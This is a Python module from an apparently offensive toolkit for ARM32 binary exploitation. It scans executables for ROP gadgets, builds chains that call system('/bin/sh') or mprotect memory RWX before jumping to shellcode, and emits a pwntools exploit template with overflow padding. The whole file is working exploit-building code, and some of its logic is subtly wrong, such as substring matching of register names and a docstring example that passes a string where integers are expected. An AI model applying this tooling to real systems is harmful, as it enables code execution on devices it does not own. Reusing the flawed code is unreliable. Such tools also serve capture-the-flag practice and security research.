"""
ARM32 exploitation support.

Provides ARM-specific binary analysis and exploitation for embedded systems.
"""

from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple, Union

from supwngo.utils.logging import get_logger

logger = get_logger(__name__)

try:
    from pwn import ELF, context
    PWNTOOLS_AVAILABLE = True
except ImportError:
    PWNTOOLS_AVAILABLE = False


@dataclass
class ARMProtections:
    """ARM binary protections."""
    nx: bool = False
    pie: bool = False
    stack_canary: bool = False
    relro: str = "No RELRO"
    thumb_mode: bool = False  # Uses Thumb instructions


@dataclass
class ARMGadget:
    """ARM ROP gadget."""
    address: int
    instructions: str
    is_thumb: bool = False
    sets_register: Optional[str] = None
    bytes_length: int = 0


@dataclass
class ARMBinary:
    """ARM binary information."""
    path: Path
    bits: int = 32
    endianness: str = "little"
    entry_point: int = 0
    protections: ARMProtections = field(default_factory=ARMProtections)
    symbols: Dict[str, int] = field(default_factory=dict)
    plt: Dict[str, int] = field(default_factory=dict)
    got: Dict[str, int] = field(default_factory=dict)


class ARMExploit:
    """
    ARM32 exploitation techniques.

    Example:
        arm = ARMExploit("target_arm")

        # Find gadgets
        gadgets = arm.find_gadgets()

        # Build ROP chain
        chain = arm.build_rop_chain(
            target_func="system",
            arg="/bin/sh"
        )
    """

    # ARM calling convention: r0-r3 for args, lr for return
    ARG_REGS = ['r0', 'r1', 'r2', 'r3']
    RETURN_REG = 'lr'

    def __init__(self, path: Union[str, Path]):
        """
        Initialize ARM exploit.

        Args:
            path: Path to ARM binary
        """
        self.path = Path(path)

        if not self.path.exists():
            raise FileNotFoundError(f"Binary not found: {path}")

        self._elf = None
        self.binary = ARMBinary(path=self.path)

        self._load_binary()

    def _load_binary(self):
        """Load and parse ARM binary."""
        if PWNTOOLS_AVAILABLE:
            try:
                self._elf = ELF(str(self.path))
                context.arch = 'arm'
                context.bits = 32

                self.binary.entry_point = self._elf.entry
                self.binary.symbols = dict(self._elf.symbols)
                self.binary.plt = dict(self._elf.plt)
                self.binary.got = dict(self._elf.got)

                # Parse protections
                self.binary.protections.nx = self._elf.nx
                self.binary.protections.pie = self._elf.pie
                self.binary.protections.stack_canary = self._elf.canary
                self.binary.protections.relro = self._elf.relro or "No RELRO"

            except Exception as e:
                logger.warning(f"Error loading with pwntools: {e}")
                self._load_manual()
        else:
            self._load_manual()

    def _load_manual(self):
        """Manually parse ARM ELF."""
        try:
            with open(self.path, 'rb') as f:
                magic = f.read(20)

            if magic[:4] != b'\x7fELF':
                raise ValueError("Not an ELF file")

            # Check if ARM
            ei_data = magic[5]
            self.binary.endianness = "little" if ei_data == 1 else "big"

            e_machine = int.from_bytes(magic[18:20],
                                      'little' if ei_data == 1 else 'big')
            if e_machine != 40:  # EM_ARM
                raise ValueError("Not an ARM binary")

        except Exception as e:
            logger.error(f"Error parsing binary: {e}")

    def find_gadgets(self, pattern: Optional[str] = None) -> List[ARMGadget]:
        """
        Find ARM ROP gadgets.

        Args:
            pattern: Optional filter pattern

        Returns:
            List of gadgets
        """
        gadgets = []

        try:
            from capstone import Cs, CS_ARCH_ARM, CS_MODE_ARM, CS_MODE_THUMB

            # Try both ARM and Thumb modes
            for mode_name, mode in [("ARM", CS_MODE_ARM), ("Thumb", CS_MODE_THUMB)]:
                md = Cs(CS_ARCH_ARM, mode)

                if not self._elf:
                    continue

                # Search executable sections
                for section in self._elf.sections:
                    if not (section.header.sh_flags & 0x4):  # SHF_EXECINSTR
                        continue

                    data = self._elf.read(section.header.sh_addr, section.header.sh_size)

                    # Find gadget-ending instructions
                    # ARM: bx lr (0xe12fff1e), pop {pc} variants
                    # Thumb: bx lr (0x4770), pop {pc} variants

                    insn_size = 2 if mode == CS_MODE_THUMB else 4

                    for i in range(0, len(data) - insn_size, insn_size):
                        chunk = data[max(0, i - 20):i + insn_size]
                        addr = section.header.sh_addr + i - (20 if i >= 20 else i)

                        if mode == CS_MODE_THUMB:
                            addr |= 1  # Thumb bit

                        try:
                            insns = list(md.disasm(chunk, addr))
                            if not insns:
                                continue

                            # Check for gadget-ending instructions
                            last = insns[-1]
                            is_gadget = False

                            if last.mnemonic == 'bx' and 'lr' in last.op_str:
                                is_gadget = True
                            elif last.mnemonic == 'pop' and 'pc' in last.op_str:
                                is_gadget = True

                            if is_gadget:
                                disasm = "; ".join(
                                    f"{ins.mnemonic} {ins.op_str}".strip()
                                    for ins in insns
                                )

                                if pattern and pattern.lower() not in disasm.lower():
                                    continue

                                gadget = ARMGadget(
                                    address=insns[0].address,
                                    instructions=disasm,
                                    is_thumb=(mode == CS_MODE_THUMB),
                                    bytes_length=len(chunk)
                                )

                                # Check what registers it sets
                                for ins in insns:
                                    if ins.mnemonic == 'pop':
                                        gadget.sets_register = ins.op_str

                                gadgets.append(gadget)

                        except Exception:
                            continue

        except ImportError:
            logger.warning("Capstone not available")
        except Exception as e:
            logger.debug(f"Error finding gadgets: {e}")

        # Remove duplicates
        seen = set()
        unique = []
        for g in gadgets:
            if g.address not in seen:
                seen.add(g.address)
                unique.append(g)

        logger.info(f"Found {len(unique)} ARM gadgets")
        return unique

    def find_pop_gadgets(self) -> Dict[str, ARMGadget]:
        """Find pop gadgets for specific registers."""
        pop_gadgets = {}

        for gadget in self.find_gadgets("pop"):
            # Parse which registers are popped
            if "pop" in gadget.instructions:
                for reg in self.ARG_REGS + ['pc', 'lr']:
                    if reg in gadget.instructions:
                        if reg not in pop_gadgets:
                            pop_gadgets[reg] = gadget

        return pop_gadgets

    def build_rop_chain(
        self,
        target_func: str,
        args: List[int] = None
    ) -> Optional[bytes]:
        """
        Build ROP chain to call function with arguments.

        ARM calling convention:
        - r0-r3: First 4 arguments
        - Stack: Additional arguments
        - lr: Return address

        Args:
            target_func: Function to call (name or address)
            args: Arguments to pass

        Returns:
            ROP chain bytes or None
        """
        args = args or []
        chain = bytearray()

        # Get function address
        if isinstance(target_func, str):
            if target_func in self.binary.plt:
                func_addr = self.binary.plt[target_func]
            elif target_func in self.binary.symbols:
                func_addr = self.binary.symbols[target_func]
            else:
                logger.warning(f"Function {target_func} not found")
                return None
        else:
            func_addr = target_func

        # Find gadgets to set r0-r3
        pop_gadgets = self.find_pop_gadgets()

        # Build chain to set arguments
        for i, arg in enumerate(args[:4]):
            reg = self.ARG_REGS[i]
            if reg in pop_gadgets:
                gadget = pop_gadgets[reg]
                addr = gadget.address
                if gadget.is_thumb:
                    addr |= 1  # Set Thumb bit

                chain.extend(addr.to_bytes(4, self.binary.endianness))
                chain.extend(arg.to_bytes(4, self.binary.endianness))

        # Call target function
        chain.extend(func_addr.to_bytes(4, self.binary.endianness))

        return bytes(chain)

    def build_shellcode_chain(
        self,
        shellcode_addr: int,
        mprotect_addr: Optional[int] = None
    ) -> Optional[bytes]:
        """
        Build chain to execute shellcode.

        If NX is enabled, first call mprotect to make shellcode executable.

        Args:
            shellcode_addr: Address of shellcode
            mprotect_addr: Address of mprotect (if needed)

        Returns:
            ROP chain bytes
        """
        chain = bytearray()

        if self.binary.protections.nx and mprotect_addr:
            # Call mprotect(shellcode_addr & ~0xfff, 0x1000, 7)
            page_addr = shellcode_addr & ~0xfff

            # r0 = address, r1 = size, r2 = prot (7 = RWX)
            pop_gadgets = self.find_pop_gadgets()

            if 'r0' in pop_gadgets:
                chain.extend(pop_gadgets['r0'].address.to_bytes(4, 'little'))
                chain.extend(page_addr.to_bytes(4, 'little'))

            if 'r1' in pop_gadgets:
                chain.extend(pop_gadgets['r1'].address.to_bytes(4, 'little'))
                chain.extend((0x1000).to_bytes(4, 'little'))

            if 'r2' in pop_gadgets:
                chain.extend(pop_gadgets['r2'].address.to_bytes(4, 'little'))
                chain.extend((7).to_bytes(4, 'little'))  # PROT_READ|WRITE|EXEC

            chain.extend(mprotect_addr.to_bytes(4, 'little'))

        # Jump to shellcode
        chain.extend(shellcode_addr.to_bytes(4, 'little'))

        return bytes(chain)

    def generate_exploit_template(self) -> str:
        """Generate ARM exploit template."""
        template = f'''#!/usr/bin/env python3
"""
ARM Exploit Template
Generated by supwngo

Target: {self.path.name}
Architecture: ARM32 ({self.binary.endianness} endian)
"""

from pwn import *

# Binary setup
binary = ELF("{self.path}")
context.binary = binary
context.arch = "arm"

# Useful addresses
'''
        for name, addr in list(self.binary.plt.items())[:10]:
            template += f'{name.upper()}_PLT = {hex(addr)}\n'

        template += '''
# Gadgets
'''
        for gadget in self.find_gadgets()[:10]:
            thumb = " (Thumb)" if gadget.is_thumb else ""
            template += f'# {hex(gadget.address)}: {gadget.instructions}{thumb}\n'

        template += '''

def build_rop():
    """Build ROP chain."""
    chain = b""

    # TODO: Add gadgets to set r0-r3 for arguments
    # chain += p32(pop_r0_gadget)
    # chain += p32(arg0)

    # Call target function
    # chain += p32(target_func)

    return chain

def exploit():
    # p = process(binary.path)
    # p = remote("target", 1337)

    payload = b""
    payload += b"A" * 100  # Padding to return address
    payload += build_rop()

    # p.send(payload)
    # p.interactive()

if __name__ == "__main__":
    exploit()
'''
        return template

    def summary(self) -> str:
        """Get ARM exploitation summary."""
        lines = [
            "ARM Exploitation Analysis",
            "=" * 40,
            f"Binary: {self.path.name}",
            f"Endianness: {self.binary.endianness}",
            f"Entry: {hex(self.binary.entry_point)}",
            "",
            "Protections:",
            f"  NX: {self.binary.protections.nx}",
            f"  PIE: {self.binary.protections.pie}",
            f"  Canary: {self.binary.protections.stack_canary}",
            f"  RELRO: {self.binary.protections.relro}",
            "",
            f"PLT entries: {len(self.binary.plt)}",
            f"Symbols: {len(self.binary.symbols)}",
        ]

        gadgets = self.find_gadgets()
        lines.append(f"ROP gadgets: {len(gadgets)}")

        return "\n".join(lines)


def build_arm_rop(binary_path: str, target: str, args: List[int] = None) -> Optional[bytes]:
    """
    Convenience function to build ARM ROP chain.

    Args:
        binary_path: Path to ARM binary
        target: Target function
        args: Arguments

    Returns:
        ROP chain bytes
    """
    arm = ARMExploit(binary_path)
    return arm.build_rop_chain(target, args or [])
